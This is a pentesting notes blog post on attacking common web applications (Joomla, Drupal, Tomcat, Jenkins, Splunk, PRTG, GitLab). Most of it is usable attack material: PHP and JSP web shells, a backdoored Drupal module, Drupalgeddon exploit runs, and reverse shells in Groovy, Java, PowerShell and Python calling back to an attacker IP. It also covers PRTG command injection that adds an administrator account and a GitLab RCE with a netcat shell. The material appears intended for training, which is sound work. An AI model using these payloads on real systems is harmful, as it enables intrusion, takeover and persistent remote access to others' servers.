---
title: Notes | Attacking Common Applications
author: Zeropio
date: 2022-08-11
categories: [Notes, Web]
tags: [cms, tomcat, jenkins, splunk, gitlab]
permalink: /notes/web/common-applications
---

Web-based applications are the most prevalent system during pentesting. We will face CMS, web applications, intranet portals, repositories, network monitoring tools, ticketing systems, wikis, knowledge bases, issue trackers, servlet container applications,... Web applications are interactive applications that can be accessed via web browsers, with a client-server architecture. Usually, made with a frontend and a backend. For example, some of the applications we may face:

| **Category**   | **Applications**    |
|--------------- | --------------- |
| Web Content Management | Joomla, Drupal, WordPress, DotNetNuke, etc. |
| Application Servers | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| Security Information and Event Management (SIEM) | Splunk, Trustwave, LogRhythm, etc. |
| Network Management | PRTG Network Monitor, ManageEngine Opmanger, etc. |
| IT Management | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc. |
| Software Frameworks | JBoss, Axis2, etc. |
| Customer Service Management	| osTicket, Zendesk, etc. |
| Search Engines | Elasticsearch, Apache Solr, etc. |
| Software Configuration Management | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc. |
| Software Development Tools | Jenkins, Atlassian Confluence, phpMyAdmin, etc. |
| Enterprise Application Integration | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc. |

Usually, we will face:
- WordPress 
- Drupal 
- Joomla
- Tomcat
- Jenkins
- Splunk
- PRTG Network Monitor
- osTicket
- GitLab 

After performing a large scan to a net:
```console
zero@pio$ nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
```

We may discover numerous hosts. It is time consuming checking each one. We could be helped with tools like [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) or [Aquatone](https://github.com/michenriksen/aquatone). Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each.

Let's start with a scope list. First, do a enumeration of common web ports (**80**,**443**,**8000**,**8080**,**8180**,**8888**,**10000**) and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. We should also scan the top 10,000 ports and take a screenshot of each with the previous tools. On a non-evasive full scope penetration test we can run Nessus on the whole net.

We can do a Nmap scan to generate a XML:
```console
zero@pio$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list  
```

For EyeWitness, let's view a quick run using the Nmap XML output:
```console
zero@pio$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

Aquatone would be:
```console
zero@pio$ cat web_discovery.xml | ./aquatone -nmap
```

---

# Content Management Systems (CMS) 

## WordPress 

WordPress is an open-source Content Management System (CMS). WordPress is highly customizable as well as SEO friendly. For a in deep enumeration and explotation check [here](https://zeropio.github.io/notes/web/wordpress). 

---

## Joomla 

Joomla s another free and open-source CMS. It is written in PHP and uses MySQL in the backend. We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site:
```console
zero@pio$ curl -s http://<TARGET>/ | grep Joomla
```

The robots.txt file for a Joomla site will often look like this:
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

We can fingerprint the Joomla version if the README.txt file is present:
```console
zero@pio$ curl -s http:/<TARGET>/README.txt | head -n 5
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/`{: .filepath} directory or by browsing to `administrator/manifests/files/joomla.xml`{: .filepath}:
```console
zero@pio$ curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | xmllint --format -
```

### Enumeration

We can use [droopescan](https://github.com/SamJoan/droopescan) to help us enumerating. 
```console
zero@pio$ sudo pip3 install droopescan
```

This will be a scan:
```console
zero@pio$ droopescan scan joomla --url http://<TARGET>/
```

Probably, this won't give us much information. We can try with [JoomlaScan](https://github.com/drego85/JoomlaScan) or [JoomScan](https://github.com/OWASP/joomscan). First, install all the dependecies:
```console
zero@pio$ sudo python2.7 -m pip install urllib3
zero@pio$ sudo python2.7 -m pip install certifi
zero@pio$ sudo python2.7 -m pip install bs4
```

Let's run a scan:
```console
zero@pio$ python2.7 joomlascan.py -u http://<TARGET>
```

### Login

The default administrator account on Joomla installs is `admin`, but the password is set at install time, We can try to brute force it with this [script](https://github.com/ajnik/joomla-bruteforce):
```console
zero@pio$ sudo python3 joomla-brute.py -u http://<TARGET> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Attacking 

We can try to login in `http://<TARGET>/administrator`. We can customize a template to try making a RCE in PHP. From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu. Next, we can click on a template name. Let's choose **protostar** under the **Template** column header. This will bring us to the `Templates: Customise` page. Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows:
```php
system($_GET['cmd']);
```

Now we can call it:
```console
zero@pio$ zeropio@htb[/htb]$ curl -s http://<TARGET>/templates/protostar/error.php/error.php?cmd=id
```

Also, check the vulnerabilites. We can have a list of them [here](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html). 

---

## Drupal

Drupal is another open-source CMS that is popular among companies and developers. A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard **Drupal logo**, the presence of a `CHANGELOG.txt`{: .filepath} file or `README.txt`{: .filepath} file, via the page source, or clues in the robots.txt file such as references to `/node`{: .filepath}:
```console
zero@pio$ curl -s http://<TARGET> | grep Drupal
```

Another way to identify Drupal CMS is through **nodes**. The page URIs are usually of the form `/node/<nodeid>`{: .filepath}. 

Drupal supports three types of users by default:
- **Administrator**: This user has complete control over the Drupal website
- **Authenticated User**: These users can log in to the website and perform operations such as adding and editing articles based on their permissions
- **Anonymous**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts

Let's look at an example of enumerating the version number using the `CHANGELOG.txt`{: .filepath} file:
```console
zero@pio$ curl -s http://<TARGET>/CHANGELOG.txt | grep -m2 ""
```

We can try with **droopescan** again:
```console
zero@pio$ droopescan scan drupal -u http://<TARGET>
```

### PHP Filter

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which *Allows embedded PHP code/snippets to be evaluated* in `http://<TARGET>/#overlay=admin/modules`:

![PHP Filter](/assets/img/notes/web/drupal_php_module.png)

Then we can create a basic page:

![Basic Page]((/assets/img/notes/web/basic_page.png)

Inside the page we can add:
```php
<?php
system($_GET['cmd']);
?>
```

We also want to make sure to set **Text format** drop-down to **PHP code**. Now go to the page, for example in node 4:
```console
zero@pio$ curl -s http://<TARGET>/node/4?cmd=id | grep uid | cut -f4 -d">"
```

From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. We'd start by downloading the most recent version of the module from the Drupal website:
```console
zero@pio$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to `Administration > Reports > Available updates` and upload the file downloaded. Once the module is installed, we can click on **Content** and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select **PHP code** from the **Text format** dropdown.

### Backdoored Module

Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Take for example a CAPTCHA module:
```console
zero@pio$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
zero@pio$ tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:
```php
<?php
system($_GET[cmd]);
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the `/modules`{: .filepath} folder:
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

Copy both of these files to the captcha folder and create an archive:
```console
zero@pio$ mv shell.php .htaccess captcha
zero@pio$ tar cvf captcha.tar.gz captcha/
```

With administrative access, click on **Manage** and then **Extend** on the sidebar. Now install our CAPTCHA module. Once the installation succeeds, browse to `/modules/captcha/shell.php`{: .filepath} to execute commands:
```console
zero@pio$ curl -s <TARGET>/modules/captcha/shell.php?cmd=id
```

### Drupalgeddon

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed Drupalgeddon. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence:
- [CVE-2014-3704](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql)
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002)
- [CVE-2018-7602](https://www.cvedetails.com/cve/CVE-2018-7602/)

We can get the script [here](https://www.exploit-db.com/exploits/34992). Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user:
```console
zero@pio$ python2.7 drupalgeddon.py -t http://<TARGET> -u hacker -p pwnd
```

If everything works, we have a new admin account added. There is also the `exploit/multi/http/drupal_drupageddon` Metasploit module.

This [script](https://www.exploit-db.com/exploits/44448) confirm the Vulnerability:
```console
zero@pio$ python3 drupalgeddon2.py
```

This script upload a `hello.txt`{: .filepath}. We can check quickly with cURL and see that the file was indeed uploaded:
```console
zero@pio$ curl -s http://<TARGET>/hello.txt
```

Now we can modified the script to upload a reverse shell:
```console
zero@pio$ echo '<?php system($_GET[cmd]);?>' | base64 
zero@pio$ echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php
```

Modified the script to send this file.

Now [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3). We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Now with Metasploit:
```console
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts <TARGET>
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST <VHOST>   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session <COOKIE>
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE <ID>
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST <OUR IP>
msf6 exploit(multi/http/drupal_drupageddon3) > run
```

---

# Servlet Containers 

## Tomcat

Apache Tomcat is an open-source web server that hosts applications. Tomcat is often less apt to be exposed to the internet. Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the `/docs`{: .filepath} page:
```console
zero@pio$ curl -s http://<TARGET>:8080/docs/ | grep Tomcat 
```

Here is the general folder structure of a Tomcat installation:
```
  
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

The **bin** folder stores scripts and binaries needed to start and run a Tomcat server. The **conf** folder stores various configuration files used by Tomcat. The **tomcat-users.xml** file stores user credentials and their assigned roles. The **lib** folder holds the various JAR files needed for the correct functioning of Tomcat. The **logs** and **temp** folders store temporary log files. The **webapps** folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime. Each folder inside **webapps** is expected to have the following structure:
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```

The most important file among these is `WEB-INF/web.xml`{: .filepath}, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. 

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager`{: .filepath} and the `/host-manager`{: filepath} pages:
```console
zero@pio$ gobuster dir -u http://<TARGET>:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`,... Inside, we can upload a reverse shell in a WAR file.

###  Login Brute Force

If we can access the `/manager`{: .filepath} or `/host-manager`{: .filepath} endpoints, we can likely achieve remote code execution on the Tomcat server. We can use the Metasploit module `auxiliary/scanner/http/tomcat_mgr_login`.  We should also set `STOP_ON_SUCCESS` to true so the scanner stops when we get a successful login:
```console
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <VHOST>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <TARGET>
```

If we face errors we can redirect all the output to Burp to analyze it.
```console
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```

Now in Burp we can see each request. We can use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) script to bruteforcing it.
```console
zero@pio$ python3 mgr_brute.py -U http://<TARGET>:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### WAR File Upload 

After performing a brute force attack browse to `http://<TAGRTET>:8180/manager/html` and enter the credentials. The manager web app allows us to instantly deploy new applications by uploading WAR files. This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table. We can upload the following file:
```console
zero@pio$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zero@pio$  zip -r backup.war cmd.jsp 
```

Now we have access to the webshell:
```console
zero@pio$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

To use a reverse shell:
```console
zero@pio$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<OUR IP> LPORT=4443 -f war > backup.war
```

Start a Netcat listener and click on `/backup` to execute the shell. The `multi/http/tomcat_mgr_upload` Metasploit module can be used to automate the process shown above. 

---

## Jenkins 

Jenkins is an open-source automation server that helps developers build and test their software projects continuously. Jenkins runs on Tomcat **port 8080** by default. It also utilizes **port 5000** to attach slave servers. This port is used to communicate between masters and slaves. We may encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test.

### Script Console 

The script console can be reached at the URL `http://<TARGET>/script`. This console allows a user to run **Apache Groovy scripts**, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. For example, we can use the following snippet to run the `id` command:
```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![Script Jenkins](/assets/img/notes/web/groovy_web.png)

There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or `exploit/multi/http/jenkins_script_console` Metasploit module:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<OUR IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

With a netcat we will have our reverse shell. We could run commands on a Windows-based Jenkins install using this snippet:
```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use this Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port:
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

# Network Monitoring Tools 

## Splunk 

Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Spunk has not suffered from many known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409) and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642). 

The Splunk web server runs by default on **port 8000**. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page. The latest version of Splunk sets credentials during the installation process. We can discover Splunk with a quick Nmap service scan:
```console
zero@pio$ sudo nmap -sV <TARGET>

...
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
```

It is not uncommon for system administrators to install a trial of Splunk to test it out, which doesn’t require authentication. Once logged in to Splunk, we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications. Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts.

### Abusing Built-In Functionality 

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) reverse shell for Splunk to help us. To achieve this, we first need to create a custom Splunk application using the following directory structure:
```console
zero@pio$ tree splunk_shell/

splunk_shell/
├── bin
└── default
```

The bin directory will contain any scripts that we intend to run, and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner:
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('<OUR IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```

The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds:
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the **.bat** file, which will run when the application is deployed and execute the PowerShell one-liner:
```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or **.spl** file:
```console
zero@pio$ tar -cvzf updater.tar.gz splunk_shell/
```

The next step is to choose `Install app from file` and upload the application in `manager/search/apps/local`{: .filepath}. Open a netcat and start the application. If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app:
```python
import sys,socket,os,pty

ip="<TARGET>"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

---

## PRTG Network Monitor 

PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.  It can typically be found on common web ports such as **80**, **443**, or **8080**. It is possible to change the web interface port in the Setup section when logged in as an admin.
```console
zero@pio$ sudo nmap -sV -p- --open -T4 <TARGET>

...
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

PRTG has default credentials `prtgadmin:prtgadmin`. Once we have discovered PRTG, we can confirm by browsing to the URL and are presented with the login page. We can get the version as:
```console
zero@pio$ curl -s http://<TARGET>:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

### Leveraging Known Vulnerabilities 

In that version, when creating a new notification, the Parameter field is passed directly into a PowerShell script without any type of input sanitization. Go to `Setup > Account Settings > Notifications`. And there on `Add new notification`. 

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under **Program File**, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. After clicking Save, we will be redirected to the **Notifications** page and see our new notification named in the list. 

Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up.  After clicking `Test` we will get a pop-up that says **EXE notification is queued up**. Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use CrackMapExec to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as evil-winrm or something from the impacket toolkit such as wmiexec.py or psexec.py:
```console
zero@pio$ sudo crackmapexec smb <TARGET> -u prtgadm1 -p Pwn3d_by_PRTG! 
```

---

# Customer Service Mgmt & Configuration Management 

## osTicket 

osTicket is an open-source support ticketing system. Most osTicket installs will showcase the osTicket logo with the phrase **powered by** in front of it in the page's footer. The footer may also contain the words **Support Ticket System**. 

One vulnerability from osTicket (CVE-2020-24881), SSRF. If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address. With DeHashed we may find information about our target:
```console
zero@pio$ sudo python3 dehashed.py -q <TARGET> -p
```

---

## GitLab 

GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default. We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo. The only way to footprint the GitLab version number in use is by browsing to the `/help`{: .filepath} page when logged in.

There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to `/explore`{: .filepath} and see if there are any public projects that may contain something interesting.

### User Enumeration 

Though not considered a vulnerability by GitLab it is still something worth checking. We can do it with this [script](https://www.exploit-db.com/exploits/49821). GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes, there is no way changing this. 
```console
zero@pio$ ./gitlab_userenum.sh --url http://<TARGET>/ --userlist <WORDLIST>
```

### Authenticated RCE 

We can use this [script](https://www.exploit-db.com/exploits/49951) to perform a RCE in 13.10.2 version. 
```console
zero@pio$ python3 gitlab_13_10_2_rce.py -t http://<TARGET> -u <USER> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <OUR IP> 8443 >/tmp/f '
```

---

# Resources 

| **Link**   | **Description**    |
|--------------- | --------------- |
| **General** |
| [droopescan](https://github.com/SamJoan/droopescan) | A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe |
| [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) | is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible |
| [Aquatone](https://github.com/michenriksen/aquatone) | A Tool for Domain Flyovers |
| [DeHashed](https://dehashed.com/) | is a hacked-database search-engine |
| [dehashed.py](https://github.com/sm00v/Dehashed) | DeHashed tool |
| **WordPress** |
| [WPScan](https://github.com/wpscanteam/wpscan) | test the security of their WordPress websites |
| **Joomla** |
| [JoomlaScan](https://github.com/drego85/JoomlaScan) | A free software to find the components installed in Joomla CMS |
| [JoomScan](https://github.com/OWASP/joomscan) | OWASP Joomla Vulnerability Scanner Project |
| [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) | Joomla login bruteforce |
| **Drupal** |
| [Drupalgeddon](https://www.exploit-db.com/exploits/34992) | Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User) |
| [Drupalgeddon2](https://www.exploit-db.com/exploits/44448) | Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution |
| [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) | Drupal < 7.58 - Drupalgeddon 3 Authenticated Remote Code Execution |
| **Tomcat** |
| [Tomcat Manager Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) | This script will bruteforce the credential of tomcat manager or host-manager |
| **Splunk** |
| [reverse\_shell\_splunk](https://github.com/0xjpuff/reverse_shell_splunk) | A simple splunk package for obtaining reverse shells on both Windows and most \*nix systems |
| **GitLab** |
| [User Enumeration](https://www.exploit-db.com/exploits/49821) | GitLab Community Edition (CE) 13.10.3 - User Enumeration |

